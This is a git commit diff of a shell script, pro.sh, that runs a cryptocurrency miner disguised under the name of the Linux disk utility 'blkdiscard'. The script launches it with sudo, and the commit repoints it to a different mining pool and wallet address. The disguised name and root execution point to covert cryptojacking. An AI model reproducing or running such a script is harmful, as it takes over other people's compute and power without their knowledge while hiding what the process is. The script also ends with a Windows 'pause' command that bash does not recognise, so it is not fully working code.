7f57ee8c62ad668904dcbf47f079955780d69d28
Harryx77 <52307152+Harryx77@users.noreply.github.com>
2021-09-27 15:55:03 +0700

    Update pro.sh

--- pro.sh
+++ pro.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-cd "$(dirname "$0")" 
+cd "$(dirname "$0")"
 
-chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool daggerhashimoto.eu-west.nicehash.com:3353 --user 3338H9P49zfgN9DKG42bhv3CTPHmLE1ZwW.PRO --tls 0 --ethstratum ETHV1
+chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:THL6Jgj9rFPPYBdAE45nRFwfRTgqqRZ9e4.PRO --tls 0 --ethstratum ETHV1
 pause
